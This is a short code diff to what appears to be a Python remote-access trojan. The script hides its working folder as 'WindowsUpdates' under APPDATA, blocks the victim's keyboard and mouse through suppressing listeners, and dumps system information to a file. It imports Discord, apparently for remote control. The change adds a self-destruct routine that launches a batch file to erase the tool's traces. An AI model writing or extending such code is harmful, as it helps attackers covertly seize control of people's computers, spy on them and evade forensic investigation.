@@ -1,5 +1,6 @@
 import os
 from shutil import copy
+import shutil
 from PIL import ImageGrab
 from ctypes import windll
 from ctypes import c_int
@@ -17,11 +18,17 @@ import numpy as np
 import imageio
 import pynput
 import discord
+import os
 
 operation_dir = os.getenv("APPDATA") + "\WindowsUpdates"
 nullptr = POINTER(c_int)()
 kb_listener = pynput.keyboard.Listener(suppress=True)
 m_listener = pynput.mouse.Listener(suppress=True)
+
+def self_destruct():
+  script_dir = os.path.dirname(os.path.abspath(__file__))
+  script_file = os.path.join(script_dir, "..", "self_destruct.bat")
+  os.popen(f"start {script_file}")
 
 def comp_info():
   os.system("systeminfo > pc_info.txt")
